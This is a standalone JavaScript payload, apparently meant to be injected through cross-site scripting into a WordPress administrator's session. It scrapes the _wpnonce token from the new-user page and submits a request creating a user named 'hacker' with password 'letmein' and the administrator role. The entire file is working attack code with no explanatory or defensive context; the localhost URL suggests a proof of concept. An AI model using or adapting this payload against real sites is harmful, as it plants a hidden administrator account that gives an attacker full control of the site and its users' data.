// setup
var wp_url = 'http://localhost/wordpress';
var new_username = 'hacker';
var new_password = 'letmein';
var new_email = 'hacker@fakeemailaddress.com';
// create an ajax object and return it
function ajaxObject() {
    var http;
    if(window.XMLHttpRequest) { http=new XMLHttpRequest(); }
    else{ http=new ActiveXObject("Microsoft.XMLHTTP"); }
    return http;
}
// load the user page
var http1 = ajaxObject();
http1.open("GET",wp_url+"/wp-admin/user-new.php",true);
http1.onreadystatechange = function() {
    if(http1.readyState != 4)
        return;
    
    // search for _wpnonce hidden field value
    var start_string = '<input type="hidden" id="_wpnonce" name="_wpnonce" value="';
    var start = http1.responseText.indexOf(start_string, 0) + start_string.length;
    var end_string = '" />';
    var end = http1.responseText.indexOf(end_string, start);
    var _wpnonce = http1.responseText.substring(start,end);
    
    // add out new user
    var http2 = ajaxObject();
    http2.open("POST",wp_url+"/wp-admin/user-new.php",true);
    http2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    http2.send('_wpnonce='+escape(_wpnonce)+'&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&action=adduser&user_login='+escape(new_username)+'&first_name=&last_name=&email='+escape(new_email)+'&url=&pass1='+escape(new_password)+'&pass2='+escape(new_password)+'&role=administrator&adduser=Add+User');
}
http1.send();

